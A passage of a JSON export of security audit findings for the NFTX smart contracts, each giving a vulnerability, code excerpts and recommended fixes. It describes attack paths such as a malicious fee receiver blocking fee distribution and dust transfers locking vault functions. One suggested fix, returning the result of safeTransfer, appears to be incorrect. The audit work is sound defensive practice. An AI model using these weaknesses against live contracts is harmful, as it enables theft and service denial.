_sendForReceiver", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/121", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The `_sendForReceiver()` function only sets a return function in the \"if\" code block, not the \"else\" case. If the \"else\" case is true, no value is returned. The result of this oversight is that the `_sendForReceiver()` function called from the `distribute()` function could sucessfully enter its `else` block if a receiver has `isContract` set to False and successfully transfer the `amountToSend` value. The `ditribute()` function will then have `leftover > 0` and send `currentTokenBalance` to the treasury. This issue is partially due to [Solidity using implicit returns](https://github.com/ethereum/solidity/issues/2951), so if no bool value is explicitly returned, the default bool value of False will be returned.  This problem currently occurs for any receiver with `isContract` set to False. The `_addReceiver` function allows for `isContract` to be set to False, so such a condition should not result in tokens being sent to the treasury as though it was an emergency scenario.  ## Proof of Concept  The `else` block is missing a return value https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L167-L169  ## Tools Used  VS Code \"Solidity Visual Developer\" extension  ## Recommended Mitigation Steps  Verify that functions with a return value do actually return a value in all cases. Adding the line `return true;` can be added to the end of the `else` block as one way to resolve this.  Alternatively, if `isContract` should never be set to False, the code should be designed to prevent a receiver from being added with this value.  "}, {"title": "provideInventory1155 assumes tokenIds.length == amounts.length", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/117", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The `provideInventory1155()` function in contracts/solidity/NFTXStakingZap.sol contains a for loop that uses tokenIds.length to loop through the amounts array. However, if these two arrays are not the same length, the loop with trigger an error. The error could be triggered after many operations already occur, so checking that these two lengths are equal first could save gas.  ## Proof of Concept  The `provideInventory1155()` function contracts/solidity/NFTXStakingZap.sol: https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L201  ## Recommended Mitigation Steps  There are two main options to reducing the gas spend in an error condition: 1. Add the following line as the first line of the `provideInventory1155()` function: `require(tokenIds.length == amounts.length)` 2. In the for loop within the `provideInventory1155()` function, replace `i < tokenIds.length` with `i < amounts.length;`  "}, {"title": "Incorrect contract referenced in test", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/116", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The file contracts/solidity/testing/NFTXFeeDistributor2.sol references the old NFTXFeeDistributor.sol and instead should reference the new NFTXSimpleFeeDistributor.sol  ## Proof of Concept  The import and contract inheritance of contracts/solidity/testing/NFTXFeeDistributor2.sol  ## Tools Used  `npx hardhat test` fails due to this issue because the ../NFTXFeeDistributor.sol imported file is not found  ## Recommended Mitigation Steps  Reference the new NFTXSimpleFeeDistributor.sol and not NFTXFeeDistributor.sol in the import and contract inheritance  "}, {"title": "NFTXInventoryStaking._deployXToken create2 deploy result isn't zero checked", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/115", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  deployXTokenForVault call will not revert on deploy failure.  ## Proof of Concept  NFTXInventoryStaking._deployXToken is called by deployXTokenForVault: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L64  _deployXToken uses deploy generated address without check: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L160  ## Recommended Mitigation Steps  Require non zero deployedXToken address before calling __XToken_init.  "}, {"title": "NFTXVaultUpgradeable.mintTo and swapTo do not check for user supplied arrays length", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/111", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  hyh   # Vulnerability details  # Impact  On calling with arrays of different lengths various malfunctions are possible as the arrays are used as given. mintTo and swapTo outcome will not be as expected by a caller.  ## Proof of Concept  The arrays are used whenever Vault is ERC1155, i.e. when is1155 is true.  swap -> swapTo uses the arrays as given: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L258  mint -> mintTo, arrays are passed on without checks to receiveNFTs: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L190  receiveNFTs uses the arrays in a loop, assuming equal lengths without a check: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L389  ## Recommended Mitigation Steps  Add `require(tokenIds.length == amounts.length, \"tokenIds and amounts length should match\")` check in the beginning of public mintTo and swapTo endpoints.   "}, {"title": "Misleading comments", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/109", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  `XTokenUpgradeable.sol` contains many comments regarding SushiBar. It looks like the comments have been copy-pasted from another contract, and may be deceiving for a reader  ## Proof of Concept  [https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/token/XTokenUpgradeable.sol#L14](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/token/XTokenUpgradeable.sol#L14)  ## Tools Used  ## Recommended Mitigation Steps  Remove said comments  "}, {"title": "Unfair fee distribution", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/108", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  Detailed description of the impact of this finding.  Fee distribution algorithm in `NFTXSimpleFeeDistributor.sol` can led to unfair distribution of fees among receivers. The `_sendForReceiver` function returns `success = true` only when the call to receiver' `receiveRewards` is successful and the whole amount is transfered to the receiver. Otherwise, the entire fee is moved up to the next receiver, and finally to the treasury.  If a badly implemented receiver leaves a part of the fee (even 1 wei) to the fee distributor, the operation is considered unsuccessful and the entire amount of the fee is moved up to the next receiver. This could lead to the situation where one of the late receivers is unable to receive any fee at all, since some previous receiver has received more than it should have.  ## Proof of Concept  [https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L166](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L166)  [https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L69](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L69)  ## Tools Used  Editor  ## Recommended Mitigation Steps  `_sendForReceiver` should return a tuple: `(bool success, uint256 amountLeft)`. Then `amountLeft` should be used by `distribute` for the `leftover` variable  "}, {"title": "A vault can be locked from MarketplaceZap and StakingZap", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/107", "labels": ["bug", "3 (High Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  Any user that owns a vToken of a particular vault can lock the functionalities of `NFTXMarketplaceZap.sol` and `NFTXStakingZap.sol` for everyone.  Every operation performed by the marketplace, that deals with vToken minting, performs this check:  ```jsx require(balance == IERC20Upgradeable(vault).balanceOf(address(this)), \"Did not receive expected balance\"); ```  A malicious user could transfer any amount > 0 of a vault\u2019vToken to the marketplace (or staking) zap contracts, thus making the vault functionality unavailable for every user on the marketplace  ## Proof of Concept  [https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421)  [https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Remove this logic from the marketplace and staking zap contracts, and add it to the vaults (if necessary)  "}, {"title": "NFTXSimpleFeeDistributor._sendForReceiver doesn't return success if receiver is not a contract", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/105", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  hyh   # Vulnerability details  # Impact  Double spending of fees being distributed will happen in favor of the first fee receivers in the `feeReceivers` list at the expense of the last ones. As `_sendForReceiver` doesn't return success for completed transfer when receiver isn't a contract, the corresponding fee amount is sent out twice, to the current and to the next fee receiver in the list. This will lead to double payments for those receivers who happen to be next in the line right after EOAs, and missed payments for the receivers positioned closer to the end of the list as the funds available are going to be already depleted when their turn comes.  ## Proof of Concept  `distribute` use `_sendForReceiver` to transfer current vault balance across `feeReceivers`: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L67  `_sendForReceiver` returns a boolean that is used to move current distribution amount to the next receiver when last transfer failed. When `_receiver.isContract` is `false` nothing is returned, while `safeTransfer` is done: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L168  This way `_sendForReceiver` will indicate that transfer is failed and leftover amount to be added to the next transfer, i.e. the `amountToSend` will be spent twice: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L64  ## Recommended Mitigation Steps  Now: ``` function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {  if (_receiver.isContract) {  ...  } else {   IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);  } } ```  To be: ``` function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {  if (_receiver.isContract) {  ...  } else {   IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);   return true;  } } ```  "}, {"title": "`transfer()` is not recommended for sending ETH", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/94", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  WatchPug   # Vulnerability details  Since the introduction of `transfer()`, it has typically been recommended by the security community because it helps guard against reentrancy attacks. This guidance made sense under the assumption that gas costs wouldn\u2019t change. It's now recommended that transfer() and send() be avoided, as gas costs can and will change and reentrancy guard is more commonly used.  Any smart contract that uses `transfer()` is taking a hard dependency on gas costs by forwarding a fixed amount of gas: 2300.  It's recommended to stop using `transfer()` and switch to using `call()` instead.  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXV1Buyout.sol#L44-L44  ```solidity payable(msg.sender).transfer(amount); ```  Can be changed to:  ```solidity (bool success, ) = msg.sender.call{value: amount}(\"\"); require(success, \"ETH transfer failed\"); ```  "}, {"title": "`NFTXSimpleFeeDistributor#__SimpleFeeDistributor__init__()` Missing `__ReentrancyGuard_init()`", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/90", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L15-L15  ```solidity=15 contract NFTXSimpleFeeDistributor is INFTXSimpleFeeDistributor, ReentrancyGuardUpgradeable, PausableUpgradeable { ```  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L41-L47  ```solidity=41   function __SimpleFeeDistributor__init__(address _lpStaking, address _treasury) public override initializer {     __Pausable_init();     setTreasuryAddress(_treasury);     setLPStakingAddress(_lpStaking);      _addReceiver(0.8 ether, lpStaking, true);   } ```  For the upgradeable variants of OpenZipplin contracts, they should be initialized by calling the `__***_init()` function in the initializer function.  Therefore, `__SimpleFeeDistributor__init__()` should call `__ReentrancyGuard_init()` at L42.  "}, {"title": "Unchecked return value for `ERC20.approve` call", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/87", "labels": ["bug", "duplicate", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  WatchPug   # Vulnerability details  There are many functions across the codebase that will perform an ERC20.approve() call but does not check the success return value. Some tokens do not revert if the approval failed but return false instead.  Instances include:  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/other/PalmNFTXStakingZap.sol#L167-L167  ```solidity=167 IERC20Upgradeable(address(_pairedToken)).approve(_sushiRouter, type(uint256).max); ```  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/other/PalmNFTXStakingZap.sol#L313  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/other/PalmNFTXStakingZap.sol#L299  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L519  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L538  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L159  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L398  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L171  It is usually good to add a require-statement that checks the return value or to use something like `safeApprove`; unless one is sure the given token reverts in case of a failure.  "}, {"title": "Rewards Cannot Be Claimed If LP Tokens Are Unstaked", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/73", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  `TimelockRewardDistributionTokenImpl` calculates the accumulative reward according to the following function: ``` function accumulativeRewardOf(address _owner) public view returns(uint256) {   return magnifiedRewardPerShare.mul(balanceOf(_owner)).toInt256()     .add(magnifiedRewardCorrections[_owner]).toUint256Safe() / magnitude; } ```  The calculation takes into consideration the LP token balance of token holders. Hence, if the token holder has called `emergencyExit` or `withdraw` in `NFTXLPStaking`, the LP tokens are removed from the staking contract without claiming rewards prior to this action. Therefore, in order for users to claim their fair share of rewards they must restake LP tokens and call `claimRewards`.   Similarly, `_transfer` in `TimelockRewardDistributionTokenImpl` also does not force the `from` account to claim rewards first.  ## Proof of Concept  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L195-L198 ``` function withdraw(uint256 vaultId, uint256 amount) external {     StakingPool memory pool = vaultStakingInfo[vaultId];     _withdraw(pool, amount, msg.sender); } ```  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L157-L162 ``` function emergencyExit(address _stakingToken, address _rewardToken) external {     StakingPool memory pool = StakingPool(_stakingToken, _rewardToken);     TimelockRewardDistributionTokenImpl dist = _rewardDistributionTokenAddr(pool);     require(isContract(address(dist)), \"Not a pool\");     _withdraw(pool, dist.balanceOf(msg.sender), msg.sender); } ```  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/token/TimelockRewardDistributionTokenImpl.sol#L199-L206 ``` function _transfer(address from, address to, uint256 value) internal override {   require(block.timestamp > timelock[from], \"User locked\");   super._transfer(from, to, value);    int256 _magCorrection = magnifiedRewardPerShare.mul(value).toInt256();   magnifiedRewardCorrections[from] = magnifiedRewardCorrections[from].add(_magCorrection);   magnifiedRewardCorrections[to] = magnifiedRewardCorrections[to].sub(_magCorrection); } ```  ## Tools Used  Manual code review.  ## Recommended Mitigation Steps  Consider removing functions in `NFTXLPStaking` that do not claim token rewards before unstaking LP tokens or alternatively add code to the affected functions such that rewards are claimed before withdrawing LP tokens.  "}, {"title": "Malicious receiver can make distribute function denial of service", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/69", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  cccz   # Vulnerability details  ## Impact  In the NFTXSimpleFeeDistributor.sol contract, the distribute function calls the _sendForReceiver function to distribute the fee  ```   function distribute(uint256 vaultId) external override virtual nonReentrant {     require(nftxVaultFactory != address(0));     address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId);      uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));      if (distributionPaused || allocTotal == 0) {       IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance);       return;     }      uint256 length = feeReceivers.length;     uint256 leftover;     for (uint256 i = 0; i <length; i++) {       FeeReceiver memory _feeReceiver = feeReceivers[i];       uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal);       uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));       amountToSend = amountToSend> currentTokenBalance? currentTokenBalance: amountToSend;       bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend);       if (!complete) {         leftover = amountToSend;       } else {         leftover = 0;       }     } ```  In the _sendForReceiver function, when the _receiver is a contract, the receiver's receiveRewards function will be called. If the receiver is malicious, it can execute revert() in the receiveRewards function, resulting in DOS.  ```   function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {     if (_receiver.isContract) {       IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);       // If the receive is not properly processed, send it to the treasury instead.               bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend);       (bool success,) = address(_receiver.receiver).call(payload);        // If the allowance has not been spent, it means we can pass it forward to next.       return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0;     } else {       IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);     }   } ```  ## Proof of Concept  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L157-L166  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  The contract can store the fee sent to the receiver in a state variable, and then the receiver can take it out by calling a function.  "}, {"title": "The return value of the _sendForReceiver function is not set, causing the receiver to receive more fees", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/67", "labels": ["bug", "3 (High Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  cccz   # Vulnerability details  ## Impact  In the NFTXSimpleFeeDistributor.sol contract, the distribute function is used to distribute the fee, and the distribute function judges whether the fee is sent successfully according to the return value of the _sendForReceiver function.  ```   function distribute(uint256 vaultId) external override virtual nonReentrant {     require(nftxVaultFactory != address(0));     address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId);      uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));      if (distributionPaused || allocTotal == 0) {       IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance);       return;     }      uint256 length = feeReceivers.length;     uint256 leftover;     for (uint256 i = 0; i <length; i++) {       FeeReceiver memory _feeReceiver = feeReceivers[i];       uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal);       uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));       amountToSend = amountToSend> currentTokenBalance? currentTokenBalance: amountToSend;       bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend);       if (!complete) {         leftover = amountToSend;       } else {         leftover = 0;       }     } ```  In the _sendForReceiver function, when _receiver is not a contract, no value is returned. By default, this will return false. This will make the distribute function think that the fee sending has failed, and will send more fees next time.  ```   function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {     if (_receiver.isContract) {       IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);       // If the receive is not properly processed, send it to the treasury instead.               bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend);       (bool success,) = address(_receiver.receiver).call(payload);        // If the allowance has not been spent, it means we can pass it forward to next.       return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0;     } else {       IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);     }   } ``` ## Proof of Concept  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L157-L168  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L49-L67  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  ```   function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {     if (_receiver.isContract) {       IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);       // If the receive is not properly processed, send it to the treasury instead.               bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend);       (bool success, ) = address(_receiver.receiver).call(payload);        // If the allowance has not been spent, it means we can pass it forward to next.       return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0;     } else {       - IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);       + return IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);     }   } ```  "}, {"title": "`assignDefaultFeatures` Does Nothing", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/65", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  `assignDefaultFeatures` is intended to be called by the `dev` account, however, the function itself does not take in any arguments and instead sets the `enableRandomSwap` and `enableTargetSwap` state variables to itself.  ## Proof of Concept  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L111-L117 ``` function assignDefaultFeatures() external {     require(msg.sender == 0xDEA9196Dcdd2173D6E369c2AcC0faCc83fD9346a, \"Not dev\");     enableRandomSwap = enableRandomRedeem;     enableTargetSwap = enableTargetRedeem;     emit EnableRandomSwapUpdated(enableRandomSwap);     emit EnableTargetSwapUpdated(enableTargetSwap); } ```  ## Tools Used  Manual code review.  ## Recommended Mitigation Steps  Consider removing this function altogether or adding the necessary arguments such that the `dev` account can actually set the proper state variables.  "}, {"title": "No access control on assignFees() function in NFTXVaultFactoryUpgradeable contract", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/50", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  ych18   # Vulnerability details  In If the Vault owner decides to set factoryMintFee and factoryRandomRedeemFee to zero, any user could call the function NFTXVaultFactoryUpgradeable.assignFees() and hence all the fees are updated.  "}, {"title": "`buyAndSwap1155WETH` Does Not Work As Intended", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/45", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  The `buyAndSwap1155WETH` function in `NFTXMarketplaceZap` aims to facilitate buying and swapping `ERC1155` tokens within a single transaction. The function expects to transfer `WETH` tokens from the `msg.sender` account and use these tokens in purchasing vault tokens. However, the `_buyVaultToken` call in `buyAndSwap1155WETH` actually uses `msg.value` and not `maxWethIn`. As a result, the function will not work unless the user supplies both `WETH` and native `ETH` amounts, equivalent to the `maxWethIn` amount.  ## Proof of Concept  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L284-L314 ``` function buyAndSwap1155WETH(   uint256 vaultId,    uint256[] memory idsIn,    uint256[] memory amounts,    uint256[] memory specificIds,    uint256 maxWethIn,    address[] calldata path,   address to ) public payable nonReentrant {   require(to != address(0));   require(idsIn.length != 0);   IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);   uint256 count;   for (uint256 i = 0; i < idsIn.length; i++) {       uint256 amount = amounts[i];       require(amount > 0, \"Transferring < 1\");       count += amount;   }   INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));   uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (       vault.randomSwapFee() * (count - specificIds.length)   );   uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path);   _swap1155(vaultId, idsIn, amounts, specificIds, to);    emit Swap(count, swapAmounts[0], to);    // Return extras.   uint256 remaining = WETH.balanceOf(address(this));   WETH.transfer(to, remaining); } ```  ## Tools Used  Manual code review. Discussions with Kiwi.  ## Recommended Mitigation Steps  Consider updating the `buyAndSwap1155WETH` function such that the following line of code is used instead of [this](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L306).  ``` uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path); ```  "}, {"title": "transfer return value is ignored", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/40", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  robee   # Vulnerability details  Need to use safeTransfer instead of transfer. As there are popular tokens, such as USDT that transfer/trasnferFrom method doesn\u2019t return anything. The transfer return value has to be checked (as there are some other tokens that returns false instead revert), that means you must   1. Check the transfer return value Another popular possibility is to add a whiteList. Those are the appearances (solidity file, line number, actual line):          NFTXStakingZap.sol, 401, IERC20Upgradeable(vault).transfer(to, minTokenIn-amountToken);          NFTXStakingZap.sol, 474, IERC20Upgradeable(token).transfer(msg.sender, IERC20Upgradeable(token).balanceOf(address(this)));          PalmNFTXStakingZap.sol, 190, pairedToken.transferFrom(msg.sender, address(this), wethIn);          PalmNFTXStakingZap.sol, 195, pairedToken.transfer(to, wethIn-amountEth);          PalmNFTXStakingZap.sol, 219, pairedToken.transferFrom(msg.sender, address(this), wethIn);          PalmNFTXStakingZap.sol, 224, pairedToken.transfer(to, wethIn-amountEth);          PalmNFTXStakingZap.sol, 316, IERC20Upgradeable(vault).transfer(to, minTokenIn-amountToken);          XTokenUpgradeable.sol, 54, baseToken.transfer(who, what);          NFTXFlashSwipe.sol, 51, IERC20Upgradeable(vault).transferFrom(msg.sender, address(this), mintFee + targetRedeemFee);    "}, {"title": "safeApprove of openZeppelin is deprecated", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/31", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  robee   # Vulnerability details          Deprecated safeApprove in NFTXMarketplaceZap.sol line 518: IERC20Upgradeable(vault).approve(address(sushiRouter), maxTokenIn);          Deprecated safeApprove in NFTXMarketplaceZap.sol line 537: IERC20Upgradeable(vault).approve(address(sushiRouter), maxTokenIn);          Deprecated safeApprove in NFTXSimpleFeeDistributor.sol line 158: IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);          Deprecated safeApprove in NFTXStakingZap.sol line 170: IERC20Upgradeable(address(IUniswapV2Router01(_sushiRouter).WETH())).approve(_sushiRouter, type(uint256).max);          Deprecated safeApprove in NFTXStakingZap.sol line 383: IERC20Upgradeable(vault).approve(address(sushiRouter), minTokenIn);          Deprecated safeApprove in NFTXStakingZap.sol line 397: IERC20Upgradeable(lpToken).approve(address(lpStaking), liquidity);          Deprecated safeApprove in PalmNFTXStakingZap.sol line 166: IERC20Upgradeable(address(_pairedToken)).approve(_sushiRouter, type(uint256).max);          Deprecated safeApprove in PalmNFTXStakingZap.sol line 298: IERC20Upgradeable(vault).approve(address(sushiRouter), minTokenIn);          Deprecated safeApprove in PalmNFTXStakingZap.sol line 312: IERC20Upgradeable(lpToken).approve(address(lpStaking), liquidity);          Deprecated safeApprove in NFTXFlashSwipe.sol line 56: IERC20Upgradeable(vault).approve(address(vault), allowance + count);   "}, {"title": "Unused imports", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/19", "labels": ["bug", "G 